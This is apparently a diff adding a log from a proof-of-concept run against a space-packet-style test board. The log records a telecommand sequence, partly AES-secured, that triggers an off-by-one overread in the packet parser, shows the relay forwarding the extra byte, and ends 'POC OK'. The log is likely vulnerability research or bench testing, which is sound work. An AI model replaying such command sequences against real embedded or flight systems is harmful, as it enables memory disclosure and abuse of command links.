@@ -1,0 +1,59 @@
+[   0.000] ========================================================================
+[   0.000] V0-16 SPP unpack off-by-one / overread
+[   0.000] ========================================================================
+[   1.518] --> HARD RESET (bench parity: fresh board per PoC)
+[   8.849] --> TC apid=0x0A via=usb AES  payload=00
+[   8.900] <-- TM apid=0x0A clear len=3
+[   8.952] --> TC apid=0x1D via=usb clear payload=0101
+[   9.003] <-- TM apid=0x1D clear len=4
+[   9.003] --> TC apid=0x11 via=usb clear payload=00
+[   9.464] <-- TM apid=0x11 clear len=9
+[   9.464] --> TC apid=0x15 via=usb clear payload=001005
+[   9.915] <-- TM apid=0x15 clear len=6
+[   9.915] --> TC apid=0x0D via=usb clear payload=01
+[  10.365] <-- TM apid=0x0D clear len=4
+[  10.406] --> TC apid=0x1D via=usb clear payload=03
+[  10.458] <-- TM apid=0x1D clear len=4
+[  10.458] <-- TM apid=0x09 clear len=9
+[  10.509] --> TC apid=0x1D via=usb clear payload=0a0258
+[  10.561] <-- TM apid=0x1D clear len=4
+[  10.561] --> TC apid=0x10 via=usb clear payload=00
+[  10.612] <-- TM apid=0x10 clear len=4
+[  10.612] --> TC apid=0x21 via=usb clear payload=00
+[  11.072] <-- TM apid=0x21 clear len=6
+[  11.073] --> TC apid=0x24 via=usb clear payload=0000
+[  11.114] <-- TM apid=0x24 clear len=8
+[  11.114] --> TC apid=0x24 via=usb clear payload=0100
+[  11.166] <-- TM apid=0x24 clear len=8
+[  11.166] --> TC apid=0x24 via=usb clear payload=0200
+[  11.217] <-- TM apid=0x24 clear len=8
+[  11.217] --> TC apid=0x24 via=usb clear payload=0300
+[  11.269] <-- TM apid=0x24 clear len=8
+[  11.269] --> TC apid=0x25 via=usb clear payload=0080
+[  11.310] <-- TM apid=0x25 clear len=4
+[  11.311] --> TC apid=0x1E via=usb clear payload=01
+[  11.822] <-- TM apid=0x1E clear len=5
+[  11.822] --> TC apid=0x1D via=usb clear payload=0b
+[  11.915] <-- TM apid=0x1D clear len=4
+[  11.915] --> TC apid=0x05 via=usb clear payload=12
+[  12.375] --> TC apid=0x1F via=usb clear payload=0600000000000000000000000700
+[  12.876] <-- TM apid=0x1F clear len=4
+[  12.876] --> TC apid=0x1F via=usb clear payload=05
+[  13.388] <-- TM apid=0x1F clear len=4
+[  13.388] --> TC apid=0x0A via=usb clear payload=01
+[  13.433] <-- TM apid=0x0A AES len=3
+[  21.519] --> TC apid=0x14 via=usb AES  payload=406c841500e055bb801a060008
+[  29.996] <-- TM apid=0x0E AES len=18
+[  29.996] --> REARM (bench parity: fresh board, pre-PoC)
+[  30.068] --> TC apid=0x0A via=usb clear payload=00
+[  30.120] <-- TM apid=0x0A clear len=3
+[  30.120] declared data bytes = 181, bytes on wire = 180
+[  30.120] parser returns 181 bytes, last byte = 0xFF (read past the frame)
+[  30.580] <-- TM apid=0x06 clear len=179
+[  33.537] --> TC apid=0x0F via=usb clear payload=-
+[  33.997] <-- TM apid=0x0F clear len=10
+[  33.997] payload service forwarded 179 B (frame had 178 B of msg)
+[  33.998] -- console tail: [TC - SPP] APID=0x00A SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [INFO] Secure link enabled | [TC - SPP] APID=0x026 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x026 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x014 SEQ=1 LEN=16 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x027 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x026 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x00A SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [INFO] Secure link disabled | [TC - SPP] APID=0x027 SEQ=1 LEN=193 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x006 SEQ=0 LEN=181 FLAGS=1 SEC_HDR=NO | [WARN] Payload relay used outside payload mode | [TC - SPP] APID=0x026 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x00F SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO
+[  33.998] ========================================================================
+[  33.998] POC OK
+[  33.998] ========================================================================
